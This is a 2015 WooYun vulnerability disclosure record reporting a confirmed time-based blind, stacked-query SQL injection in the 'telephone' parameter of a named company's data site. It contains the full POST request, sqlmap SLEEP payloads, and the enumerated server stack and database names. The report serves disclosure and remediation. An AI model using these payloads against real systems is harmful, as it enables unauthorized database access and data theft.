{"id": 68498, "wybug_id": "wooyun-2015-0141462", "wybug_title": "e家洁某站SQL注入/基于时间盲注/涉及多个库", "wybug_corp": "1jiajie.com", "wybug_author": "hh2014", "wybug_date": "2015-09-16 08:32", "wybug_open_date": "2015-10-31 14:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-31：\t细节向公众公开  简要描述： RT 详细说明：  \nPOST /dealData.html HTTP/1.1Content-Length: 466Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://data.1jiajie.com:80/Cookie: PHPSESSID=r0tc42r3mjc33lvtcvlockefo1; Hm_lvt_8cb0dedf820ed19a12222e3b0858424a=1442237901,1442237902; Hm_lpvt_8cb0dedf820ed19a12222e3b0858424a=1442237902; city_code=75; HMACCOUNT=04412CE13D3AC775; BDCBID=284d8f01-1a41-486a-96bd-9c96f66137af; LXB_REFER=www.acunetix-referrer.com; VERSION=2,0,0,0Host: data.1jiajie.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*address=%e5%8c%97%e4%ba%ac%e6%9c%9d%e9%98%b3%e5%8c%ba%e7%99%be%e5%ad%90%e6%b9%be%e4%b8%80%e5%8f%b7%e6%a5%bc102&address_lou=%e4%b8%80%e5%8f%b7%e6%a5%bc102&city_code=&city_name=&client_order_id=1442237876&freeCode=&order_type=&serverlist=&serviceRequest=&service_time=2014%e5%b9%b408%e6%9c%8802%e6%97%a5%20%20%e4%b8%8a%e5%8d%889:00&telephone=*\ntelephone参数存在基于时间的盲住\n\n   漏洞证明：  \nsqlmap identified the following injection points with a total of 259 HTTP(s) requests:---Parameter: #2* ((custom) POST)    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: address=%e5%8c%97%e4%ba%ac%e6%9c%9d%e9%98%b3%e5%8c%ba%e7%99%be%e5%ad%90%e6%b9%be%e4%b8%80%e5%8f%b7%e6%a5%bc102&address_lou=%e4%b8%80%e5%8f%b7%e6%a5%bc102&city_code=&city_name=&client_order_id=1442237876&freeCode=&order_type=&serverlist=&serviceRequest=&service_time=2014%e5%b9%b408%e6%9c%8802%e6%97%a5  %e4%b8%8a%e5%8d%889:00&telephone=(select(0)from(select(sleep(0)))v)/'+(select(0)from(select(sleep(0)))v)+'\"+(select(0)from(select(sleep(0)))v)+\";(SELECT * FROM (SELECT(SLEEP(5)))HOsE)#/    Vector: ;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])#---web server operating system: Linux CentOS 6.5web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0.11current user:    'sq_ejiajie@%'current database:    'sq_ejiajie'current user is DBA:    Falseavailable databases [15]:[*] ameituan[*] college[*] external_sys[*] information_schema[*] mysql[*] performance_schema[*] sms_up[*] sq_ejiajie[*] sq_ejiajie_crm[*] sq_ejiajie_data[*] sq_ejiajie_data_v2[*] sq_ejiajie_sunshine[*] sq_ejiajie_test[*] sq_ejiajie_v2[*] sq_ejiajie_v2_testsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #2* ((custom) POST)    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: address=%e5%8c%97%e4%ba%ac%e6%9c%9d%e9%98%b3%e5%8c%ba%e7%99%be%e5%ad%90%e6%b9%be%e4%b8%80%e5%8f%b7%e6%a5%bc102&address_lou=%e4%b8%80%e5%8f%b7%e6%a5%bc102&city_code=&city_name=&client_order_id=1442237876&freeCode=&order_type=&serverlist=&serviceRequest=&service_time=2014%e5%b9%b408%e6%9c%8802%e6%97%a5  %e4%b8%8a%e5%8d%889:00&telephone=(select(0)from(select(sleep(0)))v)/'+(select(0)from(select(sleep(0)))v)+'\"+(select(0)from(select(sleep(0)))v)+\";(SELECT * FROM (SELECT(SLEEP(5)))HOsE)#/    Vector: ;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])#---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #2* ((custom) POST)    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: address=%e5%8c%97%e4%ba%ac%e6%9c%9d%e9%98%b3%e5%8c%ba%e7%99%be%e5%ad%90%e6%b9%be%e4%b8%80%e5%8f%b7%e6%a5%bc102&address_lou=%e4%b8%80%e5%8f%b7%e6%a5%bc102&city_code=&city_name=&client_order_id=1442237876&freeCode=&order_type=&serverlist=&serviceRequest=&service_time=2014%e5%b9%b408%e6%9c%8802%e6%97%a5  %e4%b8%8a%e5%8d%889:00&telephone=(select(0)from(select(sleep(0)))v)/'+(select(0)from(select(sleep(0)))v)+'\"+(select(0)from(select(sleep(0)))v)+\";(SELECT * FROM (SELECT(SLEEP(6)))HOsE)#/    Vector: ;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])#---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #2* ((custom) POST)    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: address=%e5%8c%97%e4%ba%ac%e6%9c%9d%e9%98%b3%e5%8c%ba%e7%99%be%e5%ad%90%e6%b9%be%e4%b8%80%e5%8f%b7%e6%a5%bc102&address_lou=%e4%b8%80%e5%8f%b7%e6%a5%bc102&city_code=&city_name=&client_order_id=1442237876&freeCode=&order_type=&serverlist=&serviceRequest=&service_time=2014%e5%b9%b408%e6%9c%8802%e6%97%a5  %e4%b8%8a%e5%8d%889:00&telephone=(select(0)from(select(sleep(0)))v)/'+(select(0)from(select(sleep(0)))v)+'\"+(select(0)from(select(sleep(0)))v)+\";(SELECT * FROM (SELECT(SLEEP(6)))HOsE)#/    Vector: ;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])#---web server operating system: Linux CentOS 6.5web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0.11available databases [15]:[*] ameituan[*] college[*] external_sys[*] information_表没跑完，速度有点慢，证明危害即可\n   修复方案：  \n参数过滤，参数化查询\n   版权声明：转载请注明来源 hh2014@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-09-16 14:36 厂商回复： 感谢您的提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}